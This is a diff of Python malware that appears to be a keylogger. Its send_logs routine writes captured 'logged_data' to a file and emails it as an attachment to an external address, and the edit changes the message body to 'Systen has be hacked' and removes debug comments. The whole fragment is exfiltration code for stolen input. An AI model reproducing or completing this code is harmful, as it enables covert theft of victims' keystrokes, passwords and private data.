@@ -84,20 +84,19 @@ def send_logs():
 
 	MIN = 10
 	SECONDS = 60
-	#time.sleep(MIN * SECONDS) # every 10 mins write file/send log
-	time.sleep(30) # for debugging ~ yes program works :)
+	time.sleep(30)
 	while True:
 		if len(logged_data) > 1:
 			try:
 				write_file(count)
 
-				subject = f'[{user}] ~ {count}'
+				subject = f'[{user}]'
 
 				msg = MIMEMultipart()
 				msg['From'] = fromAddr
 				msg['To'] = toAddr
 				msg['Subject'] = subject
-				body = 'testing'
+				body = 'Systen has be hacked'
 				msg.attach(MIMEText(body,'plain'))
 
 				attachment = open(delete_file[0],'rb')
